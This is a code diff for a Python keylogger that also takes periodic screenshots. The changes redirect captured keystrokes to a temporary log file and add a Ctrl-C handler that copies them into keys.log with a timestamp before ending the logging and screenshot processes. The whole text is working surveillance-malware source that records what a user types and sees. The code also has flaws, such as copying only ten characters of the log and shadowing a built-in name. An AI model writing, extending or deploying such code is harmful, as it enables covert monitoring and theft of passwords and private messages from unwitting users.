@@ -4,25 +4,7 @@ import pyscreenshot as ImageGrab
 import time, datetime, sys, os
 
 LOG_FILE = os.getcwd() + '/keys.log'
-
-def keyPress(key):
-    with open(LOG_FILE,'a') as f:
-	    try: 
-	    	if key.char != None:
-	        	f.write(key.char)
-	    except AttributeError:
-	        if key == keyboard.Key.space:
-	            f.write(' ')
-	        elif key == keyboard.Key.backspace:
-	        	f.write(str(key) + '\n')
-	            # f.seek(0, 2)
-	            # size = f.tell()
-	            # if(size > 0):
-	            # 	f.truncate(size-1)
-	        elif key == keyboard.Key.enter:
-	        	f.write('\n')
-	       	else:
-	       		pass
+TEMP_FILE = os.getcwd() + '/temp.log'
 
 def getDir():
 	os.getcwd()
@@ -35,6 +17,25 @@ def getDir():
 def getTime():
 	st = time.strftime('%H:%M:%S_%Y-%m-%d.png')
 	return st
+
+def keyPress(key):
+    with open(TEMP_FILE,'a') as f:
+	    try:
+	    	if key.char != None:
+	        	f.write(key.char)
+	    except AttributeError:
+	        if key == keyboard.Key.space:
+	            f.write(' ')
+	        elif key == keyboard.Key.backspace:
+	        	f.write(str(key) + '\n')
+	        elif key == keyboard.Key.enter:
+	        	f.write('\n')
+	       	else:
+	       		try:
+	       			pass
+	       		except KeyboardInterrupt:
+	       			print('Bye')
+	       			sys.exit(0)
 
 def takeScreenShot():
 	var = 1
@@ -54,3 +55,21 @@ if __name__=='__main__':
 	screenshot.start()
 	keylog = Process(target = keyLogging)
 	keylog.start()
+
+	try:
+		while True:
+			pass
+	except KeyboardInterrupt:
+		with open(LOG_FILE, 'a') as f:
+			r = open(TEMP_FILE,'r')
+			str = r.read(10)
+			f.write('######' + time.strftime('%H:%M:%S_%Y-%m-%d') + '######\n\n')
+			f.write(str)
+			r.close()
+			os.remove(TEMP_FILE)
+		print('Terminating Processes')
+		screenshot.terminate()
+		keylog.terminate()
+		print('Processes Terminated')
+		print('System Exiting')
+		sys.exit(0)
